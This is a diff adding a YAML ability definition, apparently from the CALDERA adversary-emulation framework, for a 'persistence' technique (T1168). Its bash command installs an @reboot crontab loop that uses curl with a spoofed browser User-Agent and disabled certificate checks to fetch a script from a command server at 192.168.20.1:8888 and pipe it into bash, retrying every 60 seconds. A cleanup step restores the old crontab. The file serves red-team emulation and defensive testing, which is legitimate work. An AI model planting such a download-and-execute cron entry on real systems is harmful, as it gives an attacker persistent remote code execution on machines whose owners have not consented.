@@ -1,0 +1,21 @@
+---
+
+- id: c1e4f8f1-cb97-4d41-9621-32e5b81c70cf
+  name: Create reboot cronjob for 54ndc7t
+  description: Executes the 54ndc47 download cradle on reboot. On failture, will re-execute every 60 seconds.
+  tactic: persistence
+  technique:
+    attack_id: T1168
+    name: Local Job Scheduling
+  executors:
+    bash:
+      command: |
+        crontab -l > /tmp/calderacron.old &&
+        crontab -l > /tmp/calderacron &&
+        echo '@reboot while true; do /bin/bash -c "$(curl --noproxy 192.168.20.1 -sk -X POST -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -H "file:54ndc47.sh" https://192.168.20.1:8888/file/render)"; sleep 60; done' > /tmp/calderacron &&
+        crontab /tmp/calderacron &&
+        rm /tmp/calderacron
+      cleanup: |
+        crontab /tmp/calderacron.old &&
+        rm /tmp/calderacron.old
+
